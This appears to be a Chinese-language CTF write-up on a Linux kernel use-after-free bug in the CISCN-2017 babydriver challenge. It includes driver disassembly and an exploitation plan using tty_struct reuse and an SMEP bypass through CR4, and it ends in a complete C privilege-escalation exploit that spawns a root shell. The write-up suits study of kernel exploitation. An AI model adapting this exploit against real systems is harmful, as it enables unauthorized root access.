---
title: "kernel UAF"
slug: kernel-uaf
description: "kernel UAF 是内核中释放后仍被引用的内存漏洞，常被用于提权与容器逃逸，需结合堆布局与对象生命周期分析。"
date: 2026-10-01
author: mixt
category: linux kernel pwn
tags: [UAF, kernel pwn]
featured: false
draft: true
---
# Use After Free

## 一. UAF：悬空指针利用

* 内核分配的对象地址由内核管理，用户态一般来说拿不到直接指针

* 而如果内核中存在一个可控指针，指向了一块已经释放的内存，内核没有把它置空(悬空指针)

* 之后当内核因为其他操作重新分配内存时，完全可能把同一块物理内存分配给一个新的内核对象

* 在实际利用中，通常会选择打开设备时创建的管理结构体作为占位对象

## 二. 例：[CISCN-2017]babydriver

### CISCN - 2017 - babydriver

#### 一. 逆向分析

```sh
mixt@mixt-VMware-Virtual-Platform:~/pwn$ strings vmlinux | grep -i 'Linux version'
Linux version 4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017
```

> 内核版本为4.4.72

##### babyreads

![babyread](D:/blog/babyread.png)

```asm
.text:0000000000000130 ; =============== S U B R O U T I N E =======================================
.text:0000000000000130
.text:0000000000000130 ; Attributes: static
.text:0000000000000130
.text:0000000000000130 ; ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
.text:0000000000000130 babyread        proc near               ; DATA XREF: __mcount_loc:0000000000000420↓o
.text:0000000000000130                                         ; .data:fops↓o
.text:0000000000000130 filp = rdi                              ; file *
.text:0000000000000130 buffer = rsi                            ; char *
.text:0000000000000130 length = rdx                            ; size_t
.text:0000000000000130 offset = rcx                            ; loff_t *
.text:0000000000000130                 call    __fentry__
.text:0000000000000135                 mov     filp, buffer
.text:0000000000000138                 mov     buffer, cs:babydev_struct.device_buf
.text:000000000000013F buffer = rdi                            ; char *
.text:000000000000013F                 test    rsi, rsi
.text:0000000000000142                 jz      short loc_168
.text:0000000000000144                 cmp     cs:babydev_struct.device_buf_len, length
.text:000000000000014B                 mov     rax, 0FFFFFFFFFFFFFFFEh
.text:0000000000000152                 jbe     short locret_166
.text:0000000000000154                 push    rbp
.text:0000000000000155                 mov     rbp, rsp
.text:0000000000000158                 push    rbx
.text:0000000000000159                 mov     rbx, length
.text:000000000000015C                 call    _copy_to_user
.text:0000000000000161                 mov     rax, length
.text:0000000000000164                 pop     length
.text:0000000000000165                 pop     rbp
.text:0000000000000166
.text:0000000000000166 locret_166:                             ; CODE XREF: babyread+22↑j
.text:0000000000000166 buffer = rdi                            ; char *
.text:0000000000000166 length = rdx                            ; size_t
.text:0000000000000166 offset = rcx                            ; loff_t *
.text:0000000000000166                 rep retn
.text:0000000000000168 ; ---------------------------------------------------------------------------
.text:0000000000000168
.text:0000000000000168 loc_168:                                ; CODE XREF: babyread+12↑j
.text:0000000000000168                 mov     rax, 0FFFFFFFFFFFFFFFFh
.text:000000000000016F                 retn
.text:000000000000016F babyread        endp
.text:000000000000016F
.text:000000000000016F _text           ends
.text:000000000000016F
```

`rcx`对应的`offset`并没有任何调用，只是一个摆设

`length`被限制小于全局变量`device_buf_len`，不存在溢出风险

---

##### babywrite

![babywrite](D:/blog/babywrite.png)

---

##### babyopen

![babyopen](D:/blog/babyopen.png)

每次打开`/dev/babydev`都会分配一个`chunk`存到全局变量`babydev_struct`中

> `(char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0, 64)`
>
> * `kmalloc_caches[6]`对应64字节的`kmem_cache`
> * 0x24000C0：常规GFP分配标志
> * 64：请求的对象大小

---

##### babyicocl

![babyioctl](D:/blog/babyioctl.png)

重新申请内存，chunk大小由用户控制

---

##### babyrelease

![babyrelease](D:/blog/babyrelease.png)

在关闭设备文件时会释放该chunk，但由于没用置空指针，存在UAF漏洞

---

#### 二.利用思路

* 由于堆的指针存在全局变量中，所有fd都可以共享该指针，用fd1，fd2同时打开设备，关闭fd1，会得到一个指向空闲对象的指针

* 打开`/dev/ptmx`会创建一个`tty_struct`结构体，结构体中有一个指针虚表`tty_operations`位于偏移0x18处

  利用ioctl改变对象大小适配`tty_struct`，关闭fd1释放对象，打开`/dev/ptmx`创建`tty_struct`复用对象

  利用fd2改写tty_struct的ops，相当于得到执行一次gadget的机会

* 因为没有开启SMAP，所以可以在栈上布置`rop`和 `fake_ops`

* 栈迁移选择的gadget是`0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e`

  ![gadgets](D:/blog/gadgets.png)

  在跳到`fake_ops`的时候 ,`rax`为`fake_ops[0]`

  设`fake_ops[0] = POP_RAX_RET`，`fake_ops[1] = rop`，`fake_ops[i]=MOV_RSP_RAX_DEC_EBX_RET;`

  触发跳转即可

* 由于本题没有开启`KPTI`，所以可以在`rop`中操作`CR4`关闭`SMEP`，并手搓`swapgs和iretq`进入`get_shell`

---

#### 三.Exploit

```c
#include<stdio.h>
#include<sys/ioctl.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<fcntl.h>

#define POP_RDI_RET 0xffffffff810d238d
#define IRETQ 0xffffffff81007f79
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define POP_RAX 0xffffffff8100ce6e

size_t fake_ops[0x30];
size_t init_cred = NULL,commit_creds = NULL;
size_t user_cs,user_ss,user_sp,user_rflags;
void save_status(){
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
}

void get_shell(){
    if(getuid()){
        exit(EXIT_FAILURE);
    }
    write(1,"root!\n",6);
    system("/bin/sh");
    exit(EXIT_SUCCESS);
}


void get_root(){
    int (*commit_creds_ptr)(void *)=commit_creds;
    (*commit_creds_ptr)((void *)init_cred);
}
int main(void){
    save_status();
    int fd1,fd2,fd3;
    FILE *proc_kallsyms;
    char buf[0x50],type[0x10];
    size_t addr,i;
    proc_kallsyms = fopen("/proc/kallsyms","r");
    while(fscanf(proc_kallsyms,"%llx%s%s",&addr,type,buf)){
        if(!commit_creds && !strcmp("commit_creds",buf)){
            commit_creds = addr;
            printf("commit_creds: %llx",commit_creds);
        }
        if(!init_cred && !strcmp("init_cred",buf)){
            init_cred = addr;
            printf("init_cred: %llx",init_cred);
        }
        if(init_cred && commit_creds){
            break;
        }
    }
    size_t rop[0x50],p=0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;  //这里是在gdb中用info register cr4得到的数值
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = (size_t)get_root;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ;
    rop[p++] = (size_t)get_shell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp + 8;
    rop[p++] = user_ss;
    for(i=0;i<0x10;i++){
        fake_ops[i]=MOV_RSP_RAX_DEC_EBX_RET;
    }
    fake_ops[0]=POP_RAX;
    fake_ops[1]=(size_t)rop;
    fd1 = open("/dev/babydev",O_RDWR);
    fd2 = open("/dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0x2B8);
    close(fd1);
    fd3 = open("/dev/ptmx",O_RDWR);
    size_t tty_struct[0x20];
    read(fd2,tty_struct,0x40);
    tty_struct[3]=fake_ops;
    write(fd2,tty_struct,0x40);
    write(fd3,buf,8);
    return 0;
}
```

#### 四.说明

##### `tty_struct`

* `tty_struct`内部包含一个`const struct tty_operations *ops`指针，这个`ops`指针指向一个函数表，当用户对TTY设备执行`read，write，ioctl`等操作时，内核会通过这个指针调用响应的函数  

* `/dev`下有一个伪终端设备`ptmx`，每调用一次`open("/dev/ptmx")`都可以分配一次`tty_struct`对象  

* 结构体`tty_struct`位于`include/linux/tty.h`中，`tty_operations`位于`include/linux/tty_driver.h`中


